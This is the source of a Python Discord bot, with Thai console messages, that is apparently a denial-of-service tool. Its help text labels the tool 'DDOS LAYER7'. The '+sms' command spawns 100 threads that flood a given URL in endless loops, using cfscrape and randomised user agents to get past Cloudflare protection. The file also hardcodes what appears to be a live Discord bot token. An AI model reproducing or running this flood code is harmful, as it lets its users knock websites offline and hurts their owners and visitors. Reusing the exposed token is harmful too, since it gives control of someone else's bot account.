import discord,time
import requests
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
import threading,random
from fake_useragent import UserAgent
ua = UserAgent()
import cfscrape 

    

bot = commands.Bot(command_prefix="+",help_command=None)

        
@bot.event
async def on_connect():
    print(f"กำลังล็อกอินบอท : {bot.user}")
    time.sleep(1.0)
    print("ล็อกอินสำเร็จ")
    


@bot.command()
async def sms(ctx, url,time:int):
    await ctx.send('hello')
    def attack():
    	for i in range(800):
    		while True:
    			s = cfscrape.create_scraper()
    			send = s.get(url,headers = {"Connection": "Keep-Alive", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": f"{ua.random}", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US;q=0.9"})
    			print (f"Connect To Website {url} {str(send.status_code)}")
    for a in range(100):
    		threading.Thread(target=attack).start()
    		
    
@bot.command()
async def help(ctx):
	emBed = discord.Embed(title="Bot BY: Hee",description="วิธิใช้",color=0xff4612)
	emBed.add_field(name="DDOS LAYER7 ",value="/l7 url 100")
	

	await ctx.channel.send(embed=emBed)
    
    
    
bot.run("OTIyNDY2NzY1OTQwODc1MzA0.YcB4Hw.nV-hV5yAmUMojpvR-cKTmKj_U9A")
